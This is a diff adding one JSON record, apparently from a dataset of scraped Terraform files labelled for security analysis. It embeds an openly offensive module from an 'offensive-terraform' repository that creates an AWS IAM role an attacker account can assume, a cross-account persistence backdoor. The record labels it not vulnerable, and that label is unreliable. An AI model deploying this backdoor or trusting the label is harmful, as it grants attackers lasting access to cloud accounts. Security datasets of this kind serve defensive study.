@@ -1,0 +1,14 @@
+{
+  "id": "policy_107",
+  "filename": "main.tf",
+  "source_repo": "offensive-terraform/terraform-aws-cross-account-persistence",
+  "source_path": "main.tf",
+  "content": "data \"aws_iam_policy_document\" \"this\" {\n  statement {\n    effect  = \"Allow\"\n    actions = [\"sts:AssumeRole\"]\n    principals {\n      type        = \"AWS\"\n      identifiers = [\"arn:aws:iam::${var.attacker_account_id}:root\"]\n    }\n  }\n}\n\nresource \"aws_iam_role\" \"this\" {\n  name               = var.role_name\n  assume_role_policy = data.aws_iam_policy_document.this.json\n}\n\nresource \"aws_iam_role_policy_attachment\" \"this\" {\n  role       = aws_iam_role.this.name\n  policy_arn = var.policy_arn\n}\n",
+  "metadata": {
+    "vulnerable": false,
+    "confidence": "Medium",
+    "notes": "Actions restricted to specific ARNs without wildcard resources",
+    "checkov_findings": "Checkov not installed",
+    "scraped_date": "2026-06-14 20:05:33"
+  }
+}
